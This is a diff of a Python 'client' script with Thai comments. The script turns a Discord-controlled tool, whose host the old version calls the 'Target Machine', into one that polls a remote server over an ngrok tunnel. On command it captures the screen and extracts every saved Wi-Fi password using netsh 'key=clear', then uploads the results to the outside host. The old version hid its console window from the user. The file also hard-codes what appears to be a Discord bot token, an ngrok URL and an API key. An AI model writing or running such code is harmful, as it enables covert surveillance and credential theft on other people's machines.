@@ -1,187 +1,343 @@
 """
-Discord Cap & Wi-Fi Client
-- คอยดักฟังคำสั่ง !cap และ !wifi จากช่องที่กำหนด
-- ทำการดึงภาพหน้าจอ หรือรันคำสั่งดึงรหัสผ่าน Wi-Fi ในเครื่อง (เฉพาะ Windows)
-- ยิงข้อมูลกลับไปหา Server ผ่าน HTTP
+Client (รันบน PC2)
+- Poll คำสั่งจาก server ผ่าน ngrok
+- cap       -> จับภาพหน้าจอส่งกลับ
+- wifi      -> ดึงข้อมูล WiFi ปัจจุบันส่งกลับ
+- wifi-pass -> ดึงรหัส WiFi ที่เคยเชื่อมต่อส่งกลับ
+
+หมายเหตุ: !wifi-pass ต้องรัน client ด้วยสิทธิ์ Administrator
+          จึงจะเห็นรหัสของทุก profile
+
+วิธีใช้:
+    python client.py              # รัน loop รอคำสั่ง
+    python client.py cap          # ยิง cap ครั้งเดียว
+    python client.py wifi         # ยิง wifi ครั้งเดียว
+    python client.py wifi-pass    # ยิง wifi-pass ครั้งเดียว
 """
 
 import asyncio
 import io
-import os
-import re
-import subprocess
-import time
+import sys
+
 import aiohttp
-import discord
 import mss
 from PIL import Image
-from dotenv import load_dotenv
 
-load_dotenv()
+# ==================== ตั้งค่า ====================
+NGROK_URL = "https://c3b7-2405-9800-b861-43ac-59f4-dced-89d8-2853.ngrok-free.app"    # ← URL จาก ngrok
+API_KEY = "18be12a48e37bcf1e70d2e0588e1db0999aef5e60ae3ba8194bb386181d341ec"        # ← ต้องตรงกับ server .env
+POLL_INTERVAL = 2.0
+MAX_WIFI_CHARS = 100_000
+# ==================================================
 
-# ============================================================
-# Config (ดึงจาก .env หรือแก้ตรงนี้)
-# ============================================================
-BOT_TOKEN = "MTQ5NzU1MDU5NjMxODgyMjQ5MA.GiTzZF.NqSPwA8XFEEPilT8wWuTS5hwwO38eYeSIhviYw"         # ใช้ Token บอทตัวเดียวกับ Server
-SERVER_URL = os.getenv("SERVER_URL", "http://localhost:8765")
-API_SECRET = os.getenv("API_SECRET", "my-secret-key")
-MONITOR_INDEX = int(os.getenv("MONITOR_INDEX", "1"))  # 1 = จอหลัก
-WATCH_CHANNELS = os.getenv("WATCH_CHANNELS", "")     # เว้นว่างไว้คือฟังทุกห้อง, หรือใส่ "123,456"
-# ============================================================
+API_UPLOAD = f"{NGROK_URL}/upload"
+API_PENDING = f"{NGROK_URL}/pending"
+API_HEALTH = f"{NGROK_URL}/health"
 
-
-def capture_screenshot(monitor_index: int = 1) -> bytes:
-    """จับภาพหน้าจอแล้วคืนค่าเป็น bytes ของรูป PNG"""
-    with mss.mss() as sct:
-        monitors = sct.monitors
-        if monitor_index >= len(monitors):
-            monitor_index = 1
-        monitor = monitors[monitor_index]
-        screenshot = sct.grab(monitor)
-
-        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
-        buffer = io.BytesIO()
-        img.save(buffer, format="PNG", optimize=True)
-        buffer.seek(0)
-        return buffer.read()
+HEADERS = {
+    "X-API-Key": API_KEY,
+    "ngrok-skip-browser-warning": "true",
+}
 
 
-def get_wifi_passwords() -> str:
-    """ดึงรายชื่อ Wi-Fi และรหัสผ่านที่เคยเชื่อมต่อในเครื่อง Windows"""
-    if os.name != 'nt':
-        return "❌ ระบบนี้รองรับการดึงรหัส Wi-Fi เฉพาะบนระบบปฏิบัติการ Windows เท่านั้น"
+# ==================== Capture ====================
+
+def capture_screen() -> bytes:
+    """จับภาพหน้าจอหลัก (monitor[1]) แล้วคืนเป็น PNG bytes"""
+    with mss.MSS() as sct:
+        monitor = sct.monitors[1]
+        shot = sct.grab(monitor)
+        img = Image.frombytes("RGB", shot.size, shot.rgb)
+        buf = io.BytesIO()
+        img.save(buf, format="PNG", optimize=True)
+        return buf.getvalue()
+
+
+async def _run_cmd(cmd: list[str], timeout: float = 10.0) -> str:
+    """รันคำสั่งแบบ async ไม่ค้าง"""
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        try:
+            stdout, stderr = await asyncio.wait_for(
+                proc.communicate(), timeout=timeout
+            )
+        except asyncio.TimeoutError:
+            proc.kill()
+            await proc.wait()
+            return f"[timeout {timeout}s] {' '.join(cmd)}"
+
+        if proc.returncode != 0:
+            return (
+                f"[error {proc.returncode}] "
+                f"{stderr.decode('utf-8', errors='replace')}"
+            )
+        return stdout.decode("utf-8", errors="replace")
+    except FileNotFoundError:
+        return f"[not found] {cmd[0]}"
+    except Exception as e:
+        return f"[exception] {e}"
+
+
+# ==================== WiFi Info ====================
+
+async def get_wifi_info_async() -> str:
+    """ดึงข้อมูล WiFi ปัจจุบัน (interfaces + profiles)"""
+    interfaces = await _run_cmd(["netsh", "wlan", "show", "interfaces"])
+    profiles = await _run_cmd(["netsh", "wlan", "show", "profiles"])
+    return f"=== Interfaces ===\n{interfaces}\n\n=== Profiles ===\n{profiles}"
+
+
+async def get_wifi_profiles() -> list[str]:
+    """ดึงชื่อ profiles WiFi ทั้งหมด"""
+    output = await _run_cmd(["netsh", "wlan", "show", "profiles"])
+    profiles = []
+    for line in output.splitlines():
+        # รูปแบบ: "    All User Profile     : KOK_5G"
+        if "All User Profile" in line and ":" in line:
+            name = line.split(":", 1)[1].strip()
+            if name:
+                profiles.append(name)
+    return profiles
+
+
+async def get_wifi_passwords_async() -> str:
+    """
+    ดึงชื่อ profiles ทั้งหมด แล้วขอรหัสของแต่ละอัน
+    ต้องรันด้วยสิทธิ์ Administrator จึงจะเห็นรหัสทุก profile
+    """
+    profiles = await get_wifi_profiles()
+    if not profiles:
+        return "[error] ไม่พบ WiFi profile"
+
+    lines = [f"พบ {len(profiles)} profiles:\n"]
+
+    for name in profiles:
+        # ต้องใช้ key=clear เพื่อให้เห็นรหัส
+        output = await _run_cmd(
+            ["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
+            timeout=8.0,
+        )
+
+        key = None
+        auth = None
+        for line in output.splitlines():
+            s = line.strip()
+            if s.startswith("Key Content"):
+                key = s.split(":", 1)[1].strip() if ":" in s else "(ว่าง)"
+            elif s.startswith("Authentication"):
+                auth = s.split(":", 1)[1].strip() if ":" in s else "?"
+
+        if key is None:
+            key = "(ไม่มีรหัส / ไม่มีสิทธิ์อ่าน — ลองรันแบบ Admin)"
+        if auth is None:
+            auth = "?"
+
+        lines.append(f"📶 {name}")
+        lines.append(f"   Auth : {auth}")
+        lines.append(f"   Pass : {key}")
+        lines.append("")
+
+    return "\n".join(lines)
+
+
+# ==================== Send ====================
+
+async def send_cap(session: aiohttp.ClientSession, channel_id: int) -> bool:
+    print("[CLIENT] capturing screen...")
+    img_bytes = await asyncio.to_thread(capture_screen)
+    print(f"[CLIENT] captured {len(img_bytes)} bytes")
+
+    data = aiohttp.FormData()
+    data.add_field("channel_id", str(channel_id), content_type="text/plain")
+    data.add_field("type", "cap", content_type="text/plain")
+    data.add_field("image", img_bytes, filename="cap.png",
+                   content_type="image/png")
 
     try:
-        # ซ่อนหน้าต่างดำ (cmd) ไม่ให้โผล่ขึ้นมากวนใจผู้ใช้ขณะรันสคริปต์
-        si = subprocess.STARTUPINFO()
-        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-
-        # 1. ดึงรายชื่อ Profile Wi-Fi ทั้งหมดออกมาก่อน
-        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], startupinfo=si).decode('cp874', errors='ignore')
-        profiles = re.findall(r"All User Profile\s*:\s*(.*)", meta_data)
-        
-        if not profiles:
-            return "ℹ️ ไม่พบประวัติการเชื่อมต่อ Wi-Fi ในเครื่องนี้"
-
-        output = [f"=== Wi-Fi Password Report (Total Profiles: {len(profiles)}) ==="]
-        
-        # 2. ค้นหารหัสผ่านของแต่ละ Profile
-        for profile in profiles:
-            profile_name = profile.strip().strip('\r')
-            try:
-                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'], startupinfo=si).decode('cp874', errors='ignore')
-                password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
-                
-                if password_match:
-                    password = password_match.group(1).strip().strip('\r')
-                    output.append(f"SSID: {profile_name:<25} | Pass: {password}")
-                else:
-                    output.append(f"SSID: {profile_name:<25} | Pass: [Open Network / No Password]")
-            except subprocess.CalledProcessError:
-                output.append(f"SSID: {profile_name:<25} | Pass: [Error: Cannot retrieve]")
-                
-        return "\n".join(output)
-        
-    except Exception as e:
-        return f"❌ เกิดข้อผิดพลาดภายในระบบ: {str(e)}"
-
-
-# ==================== Network Sender ====================
-
-async def send_screenshot_to_server(session: aiohttp.ClientSession, channel_id: int, image_bytes: bytes) -> bool:
-    """ส่งภาพหน้าจอไปยัง HTTP Server"""
-    url = f"{SERVER_URL}/screenshot"
-    try:
-        form = aiohttp.FormData()
-        form.add_field("channel_id", str(channel_id))
-        form.add_field("image", image_bytes, filename="screenshot.png", content_type="image/png")
-
-        async with session.post(url, data=form, headers={"X-API-Secret": API_SECRET}, timeout=15) as resp:
-            return resp.status == 200
-    except Exception as e:
-        print(f"[CLIENT] ❌ ไม่สามารถส่งภาพไปยัง Server: {e}")
+        async with session.post(
+            API_UPLOAD, data=data, headers=HEADERS,
+            timeout=aiohttp.ClientTimeout(total=30),
+        ) as r:
+            text = await r.text()
+            print(f"[CLIENT] upload cap -> {r.status} {text}")
+            return r.status == 200
+    except asyncio.TimeoutError:
+        print("[CLIENT] ❌ upload cap timeout")
+        return False
+    except aiohttp.ClientError as e:
+        print(f"[CLIENT] ❌ upload cap error: {e}")
         return False
 
 
-async def send_wifi_to_server(session: aiohttp.ClientSession, channel_id: int, wifi_data: str) -> bool:
-    """ส่งข้อมูล Wi-Fi ไปยัง HTTP Server"""
-    url = f"{SERVER_URL}/wifi"
+async def send_wifi(session: aiohttp.ClientSession, channel_id: int) -> bool:
+    print("[CLIENT] reading wifi info...")
+    info = await get_wifi_info_async()
+
+    if len(info) > MAX_WIFI_CHARS:
+        info = info[:MAX_WIFI_CHARS] + "\n\n[... truncated ...]"
+
+    print(f"[CLIENT] wifi info {len(info)} chars")
+
+    data = aiohttp.FormData()
+    data.add_field("channel_id", str(channel_id), content_type="text/plain")
+    data.add_field("type", "wifi", content_type="text/plain")
+    data.add_field("text", info, content_type="text/plain")
+
     try:
-        payload = {"channel_id": channel_id, "wifi_data": wifi_data}
-        async with session.post(url, json=payload, headers={"X-API-Secret": API_SECRET}, timeout=15) as resp:
-            return resp.status == 200
-    except Exception as e:
-        print(f"[CLIENT] ❌ ไม่สามารถส่งข้อมูล Wi-Fi ไปยัง Server: {e}")
+        async with session.post(
+            API_UPLOAD, data=data, headers=HEADERS,
+            timeout=aiohttp.ClientTimeout(total=30),
+        ) as r:
+            text = await r.text()
+            print(f"[CLIENT] upload wifi -> {r.status} {text}")
+            return r.status == 200
+    except asyncio.TimeoutError:
+        print("[CLIENT] ❌ upload wifi timeout")
+        return False
+    except aiohttp.ClientError as e:
+        print(f"[CLIENT] ❌ upload wifi error: {e}")
         return False
 
 
-# ==================== Discord Core Client ====================
+async def send_wifi_pass(session: aiohttp.ClientSession, channel_id: int) -> bool:
+    print("[CLIENT] reading wifi passwords...")
+    info = await get_wifi_passwords_async()
 
-class CapClient(discord.Client):
-    def __init__(self, watch_channel_ids: list[int]):
-        intents = discord.Intents.default()
-        intents.message_content = True
-        super().__init__(intents=intents)
-        self.watch_channel_ids = watch_channel_ids
-        self.http_session: aiohttp.ClientSession | None = None
+    if len(info) > MAX_WIFI_CHARS:
+        info = info[:MAX_WIFI_CHARS] + "\n\n[... truncated ...]"
 
-    async def setup_hook(self):
-        self.http_session = aiohttp.ClientSession()
+    print(f"[CLIENT] wifi-pass info {len(info)} chars")
 
-    async def close(self):
-        if self.http_session:
-            await self.http_session.close()
-        await super().close()
+    data = aiohttp.FormData()
+    data.add_field("channel_id", str(channel_id), content_type="text/plain")
+    data.add_field("type", "wifi-pass", content_type="text/plain")
+    data.add_field("text", info, content_type="text/plain")
 
-    async def on_ready(self):
-        print(f"✅ Client logged in as {self.user}")
-        watching = self.watch_channel_ids or ["ทุกช่องแชท"]
-        print(f"👁️  กำลังเฝ้าดูช่องแชท ID: {watching}")
+    try:
+        async with session.post(
+            API_UPLOAD, data=data, headers=HEADERS,
+            timeout=aiohttp.ClientTimeout(total=60),
+        ) as r:
+            text = await r.text()
+            print(f"[CLIENT] upload wifi-pass -> {r.status} {text}")
+            return r.status == 200
+    except asyncio.TimeoutError:
+        print("[CLIENT] ❌ upload wifi-pass timeout")
+        return False
+    except aiohttp.ClientError as e:
+        print(f"[CLIENT] ❌ upload wifi-pass error: {e}")
+        return False
 
-    async def on_message(self, message: discord.Message):
-        if message.author == self.user:
-            return
 
-        if self.watch_channel_ids and message.channel.id not in self.watch_channel_ids:
-            return
+# ==================== Modes ====================
 
-        command = message.content.strip().lower()
-        channel_id = message.channel.id
+async def check_health(session: aiohttp.ClientSession) -> bool:
+    try:
+        async with session.get(
+            API_HEALTH, headers=HEADERS,
+            timeout=aiohttp.ClientTimeout(total=10),
+        ) as r:
+            info = await r.json()
+            print(f"[CLIENT] health: {info}")
+            return r.status == 200
+    except Exception as e:
+        print(f"[CLIENT] health check failed: {e}")
+        return False
 
-        # 1. จัดการคำสั่ง !cap
-        if command == "!cap":
-            print(f"[CLIENT] 📸 เจอคำสั่ง !cap ในช่อง {channel_id}")
+
+async def run_loop():
+    print(f"[CLIENT] polling {API_PENDING} every {POLL_INTERVAL}s")
+    print("[CLIENT] กด Ctrl+C เพื่อหยุด")
+
+    async with aiohttp.ClientSession() as session:
+        ok = await check_health(session)
+        if not ok:
+            print("[CLIENT] ⚠️  server ไม่ตอบสนอง — ตรวจสอบ ngrok URL")
+
+        consecutive_errors = 0
+        while True:
             try:
-                image_bytes = await asyncio.to_thread(capture_screenshot, MONITOR_INDEX)
-                if self.http_session:
-                    await send_screenshot_to_server(self.http_session, channel_id, image_bytes)
-                    print(f"[CLIENT] ส่งภาพหน้าจอสำเร็จ")
+                async with session.get(
+                    API_PENDING, headers=HEADERS,
+                    timeout=aiohttp.ClientTimeout(total=10),
+                ) as r:
+                    if r.status == 200:
+                        info = await r.json()
+                        consecutive_errors = 0
+
+                        if info.get("has_task"):
+                            typ = info["type"]
+                            ch_id = info["channel_id"]
+                            print(f"[CLIENT] 📥 task: {typ} (channel={ch_id})")
+
+                            try:
+                                if typ == "cap":
+                                    await send_cap(session, ch_id)
+                                elif typ == "wifi":
+                                    await send_wifi(session, ch_id)
+                                elif typ == "wifi-pass":
+                                    await send_wifi_pass(session, ch_id)
+                            except Exception as e:
+                                print(f"[CLIENT] task error: {e}")
+                    else:
+                        body = await r.text()
+                        print(f"[CLIENT] poll -> {r.status} {body[:200]}")
+                        consecutive_errors += 1
+
+            except asyncio.TimeoutError:
+                consecutive_errors += 1
+            except aiohttp.ClientError as e:
+                print(f"[CLIENT] network error: {e}")
+                consecutive_errors += 1
             except Exception as e:
-                print(f"[CLIENT] เกิดข้อผิดพลาดในการแคปหน้าจอ: {e}")
+                print(f"[CLIENT] unexpected error: {e}")
+                consecutive_errors += 1
 
-        # 2. จัดการคำสั่ง !wifi
-        elif command == "!wifi":
-            print(f"[CLIENT] 📡 เจอคำสั่ง !wifi ในช่อง {channel_id}")
-            # รันคำสั่งระบบผ่าน Thread เพื่อป้องกันไม่ให้โปรแกรมค้าง
-            wifi_results = await asyncio.to_thread(get_wifi_passwords)
-            if self.http_session:
-                await send_wifi_to_server(self.http_session, channel_id, wifi_results)
-                print(f"[CLIENT] ส่งข้อมูล Wi-Fi สำเร็จ")
+            delay = POLL_INTERVAL
+            if consecutive_errors > 5:
+                delay = min(
+                    POLL_INTERVAL * (2 ** min(consecutive_errors - 5, 4)), 30
+                )
+                print(f"[CLIENT] backoff {delay}s (errors={consecutive_errors})")
+
+            await asyncio.sleep(delay)
 
 
-def main():
-    if not BOT_TOKEN:
-        print("❌ กรุณาตั้งค่า DISCORD_BOT_TOKEN ในไฟล์ .env")
-        return
+async def run_once(cmd: str):
+    timeout = aiohttp.ClientTimeout(total=30)
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        async with session.get(API_PENDING, headers=HEADERS) as r:
+            info = await r.json()
+            if not info.get("has_task"):
+                print("[CLIENT] ❌ ไม่มี pending request — พิมพ์คำสั่งใน Discord ก่อน")
+                return
+            ch_id = info["channel_id"]
+            typ = info["type"]
+            if typ != cmd:
+                print(f"[CLIENT] ❌ server รอ {typ} อยู่ ไม่ใช่ {cmd}")
+                return
 
-    watch_ids = []
-    if WATCH_CHANNELS:
-        watch_ids = [int(x.strip()) for x in WATCH_CHANNELS.split(",") if x.strip()]
+        if cmd == "cap":
+            await send_cap(session, ch_id)
+        elif cmd == "wifi":
+            await send_wifi(session, ch_id)
+        elif cmd == "wifi-pass":
+            await send_wifi_pass(session, ch_id)
 
-    client = CapClient(watch_channel_ids=watch_ids)
-    print(f"🚀 เริ่มทำงาน Client (Target Machine)...")
-    client.run(BOT_TOKEN)
 
+# ==================== Entry ====================
 
 if __name__ == "__main__":
-    main()
+    cmd = sys.argv[1].lower() if len(sys.argv) > 1 else None
+
+    try:
+        if cmd in ("cap", "wifi", "wifi-pass"):
+            asyncio.run(run_once(cmd))
+        else:
+            asyncio.run(run_loop())
+    except KeyboardInterrupt:
+        print("\n[CLIENT] stopped")
